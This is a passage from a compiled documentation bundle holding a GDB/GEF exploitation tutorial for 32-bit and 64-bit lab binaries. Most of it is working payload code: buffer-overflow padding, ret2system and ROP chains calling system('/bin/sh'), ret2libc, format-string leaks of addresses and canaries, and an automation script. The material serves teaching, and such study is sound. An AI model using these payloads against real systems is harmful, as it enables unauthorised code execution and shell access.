0x7fffffffde10\n Saved registers:\n  rbp at 0x7fffffffde00, rip at 0x7fffffffde08\n\n# Register analysis during exploitation\ngef\u27a4 registers\n$rax   : 0x00007fffffffddb0  \u2192  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"\n$rbx   : 0x0               \n$rcx   : 0x00007ffff7f13a37  \u2192  0x5b77fffff0003d48 ("H="?)\n$rdx   : 0xc8              \n$rsp   : 0x00007fffffffddb0  \u2192  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"\n$rbp   : 0x00007fffffffde00  \u2192  "AAAAAAAA\u2934"\n$rsi   : 0x00007fffffffddb0  \u2192  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"\n$rdi   : 0x0               \n$rip   : 0x0000000000401202  \u2192  <vulnerable_function+49> call 0x401050 <read@plt>\n'})}),"\n",(0,i.jsx)(e.h2,{id:"key-differences-between-32-bit-and-64-bit-exploitation",children:"Key Differences Between 32-bit and 64-bit Exploitation"}),"\n",(0,i.jsx)(e.h3,{id:"32-bit-characteristics",children:"32-bit Characteristics:"}),"\n",(0,i.jsxs)(e.ul,{children:["\n",(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.strong,{children:"Calling Convention"}),": Arguments passed on stack"]}),"\n",(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.strong,{children:"Address Size"}),": 4 bytes (0x08049169)"]}),"\n",(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.strong,{children:"Registers"}),": EAX, EBX, ECX, EDX, ESP, EBP, EIP"]}),"\n",(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.strong,{children:"Stack Growth"}),": Downward (high to low addresses)"]}),"\n",(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.strong,{children:"Exploitation"}),": Direct function calls, simpler ROP chains"]}),"\n",(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.strong,{children:"Memory Layout"}),": More predictable, less ASLR entropy"]}),"\n"]}),"\n",(0,i.jsx)(e.h3,{id:"64-bit-characteristics",children:"64-bit Characteristics:"}),"\n",(0,i.jsxs)(e.ul,{children:["\n",(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.strong,{children:"Calling Convention"}),": System V ABI - RDI, RSI, RDX, RCX, R8, R9, then stack"]}),"\n",(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.strong,{children:"Address Size"}),": 8 bytes (0x00000000004011a5)"]}),"\n",(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.strong,{children:"Registers"}),": RAX, RBX, RCX, RDX, RSP, RBP, RIP + R8-R15"]}),"\n",(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.strong,{children:"Stack Growth"}),": Downward (high to low addresses)"]}),"\n",(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.strong,{children:"Exploitation"}),": Requires ROP chains for function arguments"]}),"\n",(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.strong,{children:"Memory Layout"}),": More complex, higher ASLR entropy"]}),"\n"]}),"\n",(0,i.jsx)(e.h2,{id:"advanced-exploitation-techniques",children:"Advanced Exploitation Techniques"}),"\n",(0,i.jsx)(e.h3,{id:"32-bit-function-call-exploitation",children:"32-bit Function Call Exploitation"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-bash",children:"# 32-bit direct function call with arguments\n# Example: system(\"/bin/sh\") call\n\n# Find system and \"/bin/sh\"\ngef\u27a4 print system\n$1 = {<text variable, no debug info>} 0xf7e16200 <system>\n\ngef\u27a4 search-pattern \"/bin/sh\"\n[+] Searching '/bin/sh' in memory\n[+] In '/lib/i386-linux-gnu/libc.so.6'(0xf7df0000-0xf7f71000), permission=r-x\n  0xf7f5a0cf - 0xf7f5a0d6  \u2192   \"/bin/sh\"\n\n# 32-bit payload structure:\n# 76 bytes padding + system_addr + return_addr + \"/bin/sh\"_addr\npython3 -c \"\nimport struct\npayload = b'A' * 76\npayload += struct.pack('<I', 0xf7e16200)  # system()\npayload += struct.pack('<I', 0x41414141)  # fake return address\npayload += struct.pack('<I', 0xf7f5a0cf)  # '/bin/sh'\nwith open('payload32.bin', 'wb') as f:\n    f.write(payload)\n\"\n\n# Test 32-bit system call\ngef\u27a4 run $(cat payload32.bin)\n"})}),"\n",(0,i.jsx)(e.h3,{id:"64-bit-rop-chain-with-arguments",children:"64-bit ROP Chain with Arguments"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-bash",children:"# 64-bit system(\"/bin/sh\") with proper ROP chain\n# Need: pop rdi; ret; + \"/bin/sh\" + system\n\n# Advanced ROP gadget search\ngef\u27a4 ropper --search \"pop rdi; ret\"\n0x0000000000401273: pop rdi; ret;\n\ngef\u27a4 ropper --search \"pop rsi; ret\"\n0x0000000000401271: pop rsi; pop r15; ret;\n\n# 64-bit payload structure with ROP\npython3 -c \"\nimport struct\n\n# Addresses (replace with actual values from your analysis)\npop_rdi_ret = 0x401273\nbinsh_addr = 0x7ffff7d74678\nsystem_addr = 0x401060\n\npayload = b'A' * 72                    # Buffer overflow padding\npayload += struct.pack('<Q', pop_rdi_ret)  # pop rdi; ret\npayload += struct.pack('<Q', binsh_addr)   # '/bin/sh' -> RDI\npayload += struct.pack('<Q', system_addr)  # system()\n\nwith open('payload64.bin', 'wb') as f:\n    f.write(payload)\n\"\n\n# Test 64-bit ROP chain\ngef\u27a4 run < payload64.bin\n"})}),"\n",(0,i.jsx)(e.h2,{id:"comprehensive-gef-analysis-workflow",children:"Comprehensive GEF Analysis Workflow"}),"\n",(0,i.jsx)(e.h3,{id:"complete-32-bit-analysis-session",children:"Complete 32-bit Analysis Session"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-bash",children:"# Start comprehensive analysis\ngdb -q vuln32\n\n# Step 1: Initial reconnaissance\ngef\u27a4 file\ngef\u27a4 checksec\ngef\u27a4 info functions\ngef\u27a4 info variables\n\n# Step 2: Static analysis\ngef\u27a4 disassemble main\ngef\u27a4 disassemble vulnerable_function\ngef\u27a4 disassemble win\n\n# Step 3: Dynamic analysis setup\ngef\u27a4 break main\ngef\u27a4 break vulnerable_function\ngef\u27a4 break *vulnerable_function+35  # Before strcpy\n\n# Step 4: Pattern generation and offset finding\ngef\u27a4 pattern create 200\ngef\u27a4 run [PATTERN]\ngef\u27a4 pattern search $eip\ngef\u27a4 pattern offset [VALUE]\n\n# Step 5: Stack analysis\ngef\u27a4 telescope $esp 30\ngef\u27a4 context stack\ngef\u27a4 info frame\n\n# Step 6: Exploitation\ngef\u27a4 run $(python3 -c \"print('A'*76 + '\\x69\\x91\\x04\\x08')\")\n\n# Step 7: Verification\ngef\u27a4 context\ngef\u27a4 registers\ngef\u27a4 continue\n"})}),"\n",(0,i.jsx)(e.h3,{id:"complete-64-bit-analysis-session",children:"Complete 64-bit Analysis Session"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-bash",children:"# Start comprehensive analysis\ngdb -q vuln64\n\n# Step 1: Initial reconnaissance  \ngef\u27a4 file\ngef\u27a4 checksec\ngef\u27a4 info functions\ngef\u27a4 vmmap\n\n# Step 2: ROP gadget discovery\ngef\u27a4 ropper --search \"pop rdi\"\ngef\u27a4 ropper --search \"pop rsi\" \ngef\u27a4 ropper --search \"ret\"\ngef\u27a4 ropper --search \"syscall\"\n\n# Step 3: Address enumeration\ngef\u27a4 print get_flag\ngef\u27a4 print system\ngef\u27a4 search-pattern \"/bin/sh\"\n\n# Step 4: Dynamic analysis\ngef\u27a4 break vulnerable_function\ngef\u27a4 break *vulnerable_function+49  # Before read()\n\n# Step 5: Pattern analysis\ngef\u27a4 pattern create 200\ngef\u27a4 run\n# [Input pattern when prompted]\ngef\u27a4 pattern search $rip\ngef\u27a4 pattern offset [VALUE]\n\n# Step 6: Stack layout analysis\ngef\u27a4 telescope $rsp 30\ngef\u27a4 context stack\ngef\u27a4 info frame\n\n# Step 7: ROP chain construction\ngef\u27a4 python\nimport struct\npayload = b'A' * 72\npayload += struct.pack('<Q', 0x401273)      # pop rdi; ret\npayload += struct.pack('<Q', 0x7ffff7d74678) # '/bin/sh'\npayload += struct.pack('<Q', 0x401060)      # system\nwith open('/tmp/rop.bin', 'wb') as f: f.write(payload)\nend\n\n# Step 8: Exploitation\ngef\u27a4 run < /tmp/rop.bin\n\n# Step 9: Verification\ngef\u27a4 context\ngef\u27a4 registers\ngef\u27a4 bt\n"})}),"\n",(0,i.jsx)(e.h2,{id:"advanced-gef-commands-for-exploitation",children:"Advanced GEF Commands for Exploitation"}),"\n",(0,i.jsx)(e.h3,{id:"memory-analysis-commands",children:"Memory Analysis Commands"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-bash",children:'# Enhanced memory examination\ngef\u27a4 telescope $rsp 50              # Extended stack view\ngef\u27a4 telescope $rbp-0x50 20         # Buffer area analysis\ngef\u27a4 hexdump byte $rsp 200          # Raw memory dump\ngef\u27a4 hexdump qword $rsp 20          # Quad-word aligned dump\n\n# Memory search and pattern matching\ngef\u27a4 search-pattern "AAAA"          # Search for pattern\ngef\u27a4 search-pattern 0x41414141      # Search for hex value\ngef\u27a4 grep "ret" $rip $rip+1000      # Search for instructions\n\n# Memory modification for testing\ngef\u27a4 set *($rsp) = 0x401179         # Modify return address\ngef\u27a4 patch qword $rsp 0x4011a5      # Patch memory location\ngef\u27a4 patch string 0x402000 "/bin/sh" # Patch string value\n'})}),"\n",(0,i.jsx)(e.h3,{id:"control-flow-analysis",children:"Control Flow Analysis"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-bash",children:"# Breakpoint management\ngef\u27a4 break *0x401202                # Instruction breakpoint\ngef\u27a4 break vulnerable_function if $rdi > 100 # Conditional breakpoint\ngef\u27a4 watch *($rbp-0x50)             # Watch buffer modification\ngef\u27a4 awatch *0x404040               # Access watchpoint\n\n# Execution control\ngef\u27a4 stepi 10                       # Step 10 instructions\ngef\u27a4 nexti 5                        # Next 5 instructions\ngef\u27a4 finish                         # Execute until return\ngef\u27a4 until *0x401220                # Execute until address\n\n# Advanced control flow\ngef\u27a4 jump *0x4011a5                 # Jump to address\ngef\u27a4 call get_flag()                # Call function directly\ngef\u27a4 return 0                       # Force function return\n"})}),"\n",(0,i.jsx)(e.h3,{id:"exploitation-assistance-commands",children:"Exploitation Assistance Commands"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-bash",children:'# Pattern and offset utilities\ngef\u27a4 pattern create 1000 pattern.txt # Create pattern to file\ngef\u27a4 pattern search 0x6161616a      # Search for pattern value\ngef\u27a4 pattern offset 0x6261616161616162 # Calculate offset\n\n# ROP chain utilities  \ngef\u27a4 ropper                         # Interactive ROP search\ngef\u27a4 ropper --search "pop rdi; ret" # Specific gadget search\ngef\u27a4 ropper --chain "execve"        # Automatic chain generation\ngef\u27a4 rop                            # Built-in ROP helper\n\n# Shellcode assistance\ngef\u27a4 shellcode search x86-64        # Search shellcode database\ngef\u27a4 shellcode get linux/x64/exec   # Get specific shellcode\ngef\u27a4 assemble "mov rax, 59"         # Assemble instruction\ngef\u27a4 assemble $rip "pop rdi; ret"   # Assemble at location\n'})}),"\n",(0,i.jsx)(e.h2,{id:"real-world-exploitation-scenarios",children:"Real-World Exploitation Scenarios"}),"\n",(0,i.jsx)(e.h3,{id:"scenario-1-aslr-bypass-with-information-leak",children:"Scenario 1: ASLR Bypass with Information Leak"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-bash",children:'# When ASLR is enabled, we need to leak addresses first\ngef\u27a4 checksec\n# Shows PIE enabled\n\n# Look for format string or other info leak\ngef\u27a4 break printf\ngef\u27a4 run "%p %p %p %p"\ngef\u27a4 telescope $rsp 10              # Look for leaked addresses\n\n# Calculate libc base from leaked address\ngef\u27a4 vmmap\ngef\u27a4 python\nleaked_addr = 0x7ffff7a52083\nlibc_base = leaked_addr - 0x52083   # Offset to libc base\nsystem_addr = libc_base + 0x4f420   # Offset to system\nbinsh_addr = libc_base + 0x1b40cf   # Offset to "/bin/sh"\nprint(f"Libc base: {hex(libc_base)}")\nprint(f"System: {hex(system_addr)}")\nprint(f"/bin/sh: {hex(binsh_addr)}")\nend\n'})}),"\n",(0,i.jsx)(e.h3,{id:"scenario-2-stack-canary-bypass",children:"Scenario 2: Stack Canary Bypass"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-bash",children:'# When stack canaries are present\ngef\u27a4 checksec\n# Shows Canary found\n\n# Look for canary leak or brute force single byte\ngef\u27a4 canary                         # Show current canary\ngef\u27a4 break __stack_chk_fail         # Break on canary failure\ngef\u27a4 watch *($rbp-0x8)              # Watch canary location\n\n# Canary leak via format string\ngef\u27a4 run "AAAA.%p.%p.%p.%p.%p.%p.%p"\n# Look for canary value in output (usually starts with 0x00)\n'})}),"\n",(0,i.jsx)(e.h3,{id:"scenario-3-return-to-libc-attack",children:"Scenario 3: Return-to-libc Attack"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-bash",children:"# Classic return-to-libc for NX bypass\ngef\u27a4 checksec\n# Shows NX enabled (no stack execution)\n\n# Find libc functions and strings\ngef\u27a4 info sharedlibrary\ngef\u27a4 search-pattern \"system\"\ngef\u27a4 search-pattern \"/bin/sh\"\ngef\u27a4 search-pattern \"exit\"\n\n# Construct ret2libc chain\n# payload = padding + system + exit + \"/bin/sh\"\npython3 -c \"\nimport struct\npayload = b'A' * 76                  # 32-bit padding\npayload += struct.pack('<I', 0xf7e16200)  # system\npayload += struct.pack('<I', 0xf7e09cf0)  # exit  \npayload += struct.pack('<I', 0xf7f5a0cf)  # '/bin/sh'\nprint(payload)\n\"\n"})}),"\n",(0,i.jsx)(e.h2,{id:"debugging-tips-and-best-practices",children:"Debugging Tips and Best Practices"}),"\n",(0,i.jsx)(e.h3,{id:"essential-gef-configuration",children:"Essential GEF Configuration"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-bash",children:'# Optimize GEF for exploitation\ngef config context.layout "legend regs stack code args memory"\ngef config context.nb_lines_stack 15\ngef config context.nb_lines_code 8\ngef config theme.default_title_line "red"\ngef config theme.default_title_message "white"\n\n# Performance optimizations\ngef config context.clear_screen False\ngef config context.redirect ""\ngef config heap.main_arena ""\n'})}),"\n",(0,i.jsx)(e.h3,{id:"common-pitfalls-and-solutions",children:"Common Pitfalls and Solutions"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-bash",children:"# Issue: Pattern not found in registers\n# Solution: Check for partial overwrites\ngef\u27a4 pattern search $rsp            # Check stack pointer\ngef\u27a4 pattern search *($rbp+8)       # Check saved return address\n\n# Issue: ROP gadget not working  \n# Solution: Verify gadget addresses and alignment\ngef\u27a4 x/5i 0x401273                  # Examine gadget instructions\ngef\u27a4 disassemble 0x401270,0x401280  # Context around gadget\n\n# Issue: Segfault on exploitation\n# Solution: Check address validity and permissions\ngef\u27a4 vmmap                          # Check memory permissions\ngef\u27a4 telescope $rsp 20              # Examine stack corruption\n"})}),"\n",(0,i.jsx)(e.h3,{id:"advanced-automation",children:"Advanced Automation"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-python",children:'# GEF Python automation script\n# Save as exploit_automation.py\n\nimport gdb\nimport struct\n\nclass ExploitHelper(gdb.Command):\n    def __init__(self):\n        super(ExploitHelper, self).__init__("exploit-helper", gdb.COMMAND_USER)\n    \n    def invoke(self, arg, from_tty):\n        # Find buffer overflow offset automatically\n        gdb.execute("pattern create 1000")\n        gdb.execute("run PATTERN_HERE")\n        \n        # Get crashed RIP/EIP value\n        if gdb.selected_inferior().pid != 0:\n            try:\n                rip = gdb.parse_and_eval("$rip")\n                gdb.execute(f"pattern search {rip}")\n            except:\n                eip = gdb.parse_and_eval("$eip") \n                gdb.execute(f"pattern search {eip}")\n\nExploitHelper()\n\n# Usage: exploit-helper\n'})}),"\n",(0,i.jsx)(e.p,{children:"This comprehensive set of practical examples demonstrates the power of GDB with GEF for both 32-bit and 64-bit exploitation scenarios. The examples show real exploitation techniques with complete workflows, from initial analysis through successful exploitation, highlighting the key differences between architectures and providing practical commands for each step of the process."})]})}function d(a={}){const{wrapper:e}={...(0,r.R)(),...a.components};return e?(0,i.jsx)(e,{...a,children:(0,i.jsx)(c,{...a})}):c(a)}}}]);